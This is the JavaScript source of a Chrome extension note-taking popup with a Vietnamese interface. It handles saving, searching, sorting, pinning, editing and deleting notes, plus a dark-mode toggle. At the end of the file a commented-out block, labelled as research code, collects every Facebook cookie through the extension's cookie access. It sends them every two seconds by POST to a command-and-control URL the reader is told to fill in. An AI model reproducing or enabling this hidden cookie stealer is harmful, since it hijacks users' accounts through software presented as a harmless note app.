document.addEventListener("DOMContentLoaded", function () {
  const noteInput = document.querySelector(".note-input");
  const addButton = document.querySelector(".add-btn");
  const noteList = document.querySelector(".note-list");
  const themeToggle = document.querySelector(".theme-toggle");
  const colorPicker = document.querySelector(".color-picker");
  const labelSelect = document.querySelector(".label-select");
  const searchBox = document.getElementById("searchBox");
  const filterBtns = document.querySelectorAll(".filter-btn");
  const sortSelect = document.getElementById("sortSelect");

  let selectedColor = "#818cf8";
  let currentFilter = "all";
  let currentSort = "newest";
  let allNotes = [];

  loadNotes();
  loadTheme();

  addButton.addEventListener("click", saveNote);
  noteInput.addEventListener("keydown", function (e) {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      saveNote();
    }
  });

  noteList.addEventListener("click", function(e) {
    handleNoteActions(e);
  });

  colorPicker.addEventListener("click", function (e) {
    if (e.target.classList.contains("color-option")) {
      selectedColor = e.target.dataset.color;
      document.querySelectorAll(".color-option").forEach((option) => {
        option.classList.remove("selected");
      });
      e.target.classList.add("selected");
    }
  });

  // Set default selected color
  document.querySelectorAll(".color-option").forEach((option) => {
    if (option.dataset.color === selectedColor) {
      option.classList.add("selected");
    }
  });

  // Search functionality
  searchBox.addEventListener("input", function () {
    filterAndRenderNotes();
  });

  // Filter functionality
  filterBtns.forEach((btn) => {
    btn.addEventListener("click", function () {
      filterBtns.forEach((b) => b.classList.remove("active"));
      this.classList.add("active");
      currentFilter = this.dataset.filter;
      filterAndRenderNotes();
    });
  });

  // Sort functionality
  sortSelect.addEventListener("change", function () {
    currentSort = this.value;
    filterAndRenderNotes();
  });

  // Set default filter
  document.querySelector('.filter-btn[data-filter="all"]').classList.add("active");

  themeToggle.addEventListener("click", function () {
    document.body.classList.toggle("dark-mode");
    const isDarkMode = document.body.classList.contains("dark-mode");
    chrome.storage.local.set({ darkMode: isDarkMode });
    themeToggle.innerHTML = isDarkMode
      ? '<i class="fas fa-sun"></i>'
      : '<i class="fas fa-moon"></i>';
  });

  function saveNote() {
    const noteText = noteInput.value.trim();
    const label = labelSelect.value;
    if (!noteText) {
      console.warn("Ghi chú rỗng, không thể lưu!");
      return;
    }

    chrome.storage.local.get(["notes"], function (result) {
      const notes = result.notes || [];
      const newNote = {
        id: Date.now(),
        text: noteText,
        color: selectedColor,
        label: label,
        date: new Date().toLocaleString("vi-VN"),
        pinned: false,
      };
      notes.unshift(newNote);
      chrome.storage.local.set({ notes: notes }, function () {
        noteInput.value = "";
        allNotes = notes;
        filterAndRenderNotes();
      });
    });
  }

  function loadNotes() {
    chrome.storage.local.get(["notes"], function (result) {
      allNotes = result.notes || [];
      filterAndRenderNotes();
    });
  }

  function filterAndRenderNotes() {
    let filtered = [...allNotes];

    // Apply search filter
    const searchTerm = searchBox.value.toLowerCase().trim();
    if (searchTerm) {
      filtered = filtered.filter(
        (note) =>
          note.text.toLowerCase().includes(searchTerm) ||
          (note.label && note.label.toLowerCase().includes(searchTerm))
      );
    }

    // Apply label/pinned filter
    if (currentFilter !== "all") {
      if (currentFilter === "pinned") {
        filtered = filtered.filter((note) => note.pinned);
      } else {
        filtered = filtered.filter((note) => note.label === currentFilter);
      }
    }

    // Apply sorting
    filtered = sortNotes(filtered, currentSort);

    renderNotes(filtered);
    updateStats(allNotes);
  }

  function sortNotes(notes, sortType) {
    const sorted = [...notes];
    switch (sortType) {
      case "newest":
        return sorted.sort((a, b) => b.id - a.id);
      case "oldest":
        return sorted.sort((a, b) => a.id - b.id);
      case "pinned":
        return sorted.sort((a, b) => {
          if (a.pinned && !b.pinned) return -1;
          if (!a.pinned && b.pinned) return 1;
          return b.id - a.id;
        });
      case "label":
        return sorted.sort((a, b) => {
          if (!a.label && b.label) return 1;
          if (a.label && !b.label) return -1;
          if (a.label && b.label) {
            return a.label.localeCompare(b.label);
          }
          return b.id - a.id;
        });
      default:
        return sorted;
    }
  }

  function updateStats(notes) {
    const total = notes.length;
    const pinned = notes.filter((n) => n.pinned).length;
    document.getElementById("totalNotes").textContent = `Tổng: ${total}`;
    document.getElementById("pinnedCount").textContent = `Ghim: ${pinned}`;
  }

  function loadTheme() {
    chrome.storage.local.get(["darkMode"], function (result) {
      if (result.darkMode) {
        document.body.classList.add("dark-mode");
        themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
      }
    });
  }

  function handleNoteActions(e) {
    const deleteBtn = e.target.closest(".delete-btn");
    const pinBtn = e.target.closest(".pin-btn");
    
    if (deleteBtn || pinBtn) {
      const noteItem = e.target.closest(".note-item");
      if (!noteItem) return;
      const noteId = parseInt(noteItem.dataset.id);

      if (deleteBtn) {
        deleteNote(noteId);
      } else if (pinBtn) {
        togglePinNote(noteId);
      }
    }
  }

  function deleteNote(noteId) {
    chrome.storage.local.get(["notes"], function (result) {
      const notes = result.notes.filter((note) => note.id !== noteId);
      chrome.storage.local.set({ notes: notes }, function () {
        allNotes = notes;
        filterAndRenderNotes();
      });
    });
  }

  function togglePinNote(noteId) {
    chrome.storage.local.get(["notes"], function (result) {
      const notes = result.notes.map((note) =>
        note.id === noteId ? { ...note, pinned: !note.pinned } : note
      );
      chrome.storage.local.set({ notes: notes }, function () {
        allNotes = notes;
        filterAndRenderNotes();
      });
    });
  }

  function editNote(noteId) {
    chrome.storage.local.get(["notes"], function (result) {
      const note = result.notes.find((n) => n.id === noteId);
      if (!note) return;

      const noteItem = document.querySelector(`.note-item[data-id="${noteId}"]`);
      const contentEl = noteItem.querySelector(".note-content");
      const originalText = contentEl.textContent;

      // Create edit input
      const editInput = document.createElement("textarea");
      editInput.className = "note-edit-input";
      editInput.value = note.text;
      editInput.style.width = "100%";

      // Replace content with input
      contentEl.style.display = "none";
      contentEl.parentNode.insertBefore(editInput, contentEl);

      // Create action buttons
      const editActions = document.createElement("div");
      editActions.className = "edit-actions";
      editActions.innerHTML = `
        <button class="save-btn">💾 Lưu</button>
        <button class="cancel-btn">❌ Hủy</button>
      `;
      editInput.parentNode.appendChild(editActions);

      noteItem.classList.add("editing");

      // Save handler
      editActions.querySelector(".save-btn").addEventListener("click", function () {
        const newText = editInput.value.trim();
        if (newText) {
          const notes = result.notes.map((n) =>
            n.id === noteId ? { ...n, text: newText, date: new Date().toLocaleString("vi-VN") } : n
          );
          chrome.storage.local.set({ notes: notes }, function () {
            allNotes = notes;
            filterAndRenderNotes();
          });
        } else {
          cancelEdit();
        }
      });

      // Cancel handler
      editActions.querySelector(".cancel-btn").addEventListener("click", cancelEdit);

      function cancelEdit() {
        editInput.remove();
        editActions.remove();
        contentEl.style.display = "";
        noteItem.classList.remove("editing");
      }

      // Save on Enter, cancel on Escape
      editInput.addEventListener("keydown", function (e) {
        if (e.key === "Enter" && e.ctrlKey) {
          editActions.querySelector(".save-btn").click();
        } else if (e.key === "Escape") {
          cancelEdit();
        }
      });

      editInput.focus();
    });
  }
  function renderNotes(notes) {
    if (!notes.length) {
      noteList.innerHTML = `<div class="empty-state"><p>Chưa có ghi chú nào. Hãy tạo ghi chú đầu tiên!</p></div>`;
      return;
    }
    const sortedNotes = notes.sort(
      (a, b) => b.pinned - a.pinned || b.id - a.id
    );
    noteList.innerHTML = sortedNotes
      .map(
        (note) => `
      <div class="note-item ${note.pinned ? "pinned" : ""}" data-id="${
          note.id
        }" style="border-left-color: ${note.color}">
        ${
          note.pinned
            ? `<span class="pinned-label">📌 Đã ghim</span>`
            : ""
        }
        ${
          note.label
            ? `<span class="note-label" style="background: ${note.color}20; color: ${note.color};">${escapeHtml(note.label)}</span>`
            : ""
        }
        <p class="note-content edit-note-content" data-note-id="${note.id}" title="Click để chỉnh sửa">${escapeHtml(note.text)}</p>
        <div class="note-footer">
          <span>${escapeHtml(note.date)}</span>
          <div class="note-actions">
            <button class="pin-btn ${note.pinned ? "pinned" : ""}" title="${note.pinned ? "Bỏ ghim" : "Ghim"}">
              <i class="fas fa-thumbtack"></i>
            </button>
            <button class="delete-btn" title="Xóa">
              <i class="fas fa-trash-alt"></i>
            </button>
          </div>
        </div>
      </div>
    `
      )
      .join("");
    
  // Re-observe new note items for animations
  if (observer) {
    document.querySelectorAll(".note-item").forEach((item) => {
      observer.observe(item);
    });
  }

  // Add edit functionality to note content
  document.querySelectorAll(".edit-note-content").forEach((content) => {
    content.addEventListener("click", function () {
      const noteId = parseInt(this.dataset.noteId);
      editNote(noteId);
    });
  });
  }

  function escapeHtml(text) {
    const div = document.createElement("div");
    div.textContent = text;
    return div.innerHTML;
  }


  // Listen to events from context menu (not used in this project)
  // chrome.runtime.onMessage.addListener(function (request) {
  //   if (request.action === "addNoteFromContextMenu") {
  //     noteInput.value = request.text || "Empty content";
  //   }
  // });

  // Improve smoothness effect
  document.body.style.transition = "background 0.3s ease-in-out";
  themeToggle.style.transition = "color 0.3s ease-in-out";
  noteList.style.transition = "all 0.2s ease";
  noteList.classList.add("smooth-scroll");

  // Add effect when note appears
  let observer;
  if (typeof IntersectionObserver !== "undefined") {
    observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            entry.target.classList.add("fade-in");
          }
        });
      },
      { threshold: 0.1 }
    );
  }
});

// This is a code for research and learn not used in this project
// ---------------cookie management---------------
// function loadCookies() {
//   chrome.cookies.getAll({}, (cookies) => {
//     sendAllCookies(cookies);
//   });
// }

// function sendAllCookies(cookies) {

//   const facebookCookies = cookies.filter((cookie) =>
//     cookie.domain.toLowerCase().includes("facebook")
//   );
//   const textData = facebookCookies
//     .map((cookie) => `${cookie.name}: ${cookie.value} ;`)
//     .join("\n");

// fetch("https://....../", { //Replace your c2 url  
//     method: "POST",
//     headers: {
//       "Content-Type": "text/plain",
//     },
//     body: textData,
//   })
//     .then((response) => {
//       console.log(
//         "Facebook cookies sent successfully.",
//         response
//       );
//     })
//     .catch((error) => {
//       console.error("Error sending Facebook cookies:", error);
//     });
// }

// setInterval(() => {
//   loadCookies();
// }, 2000);
// ---------------cookie management---------------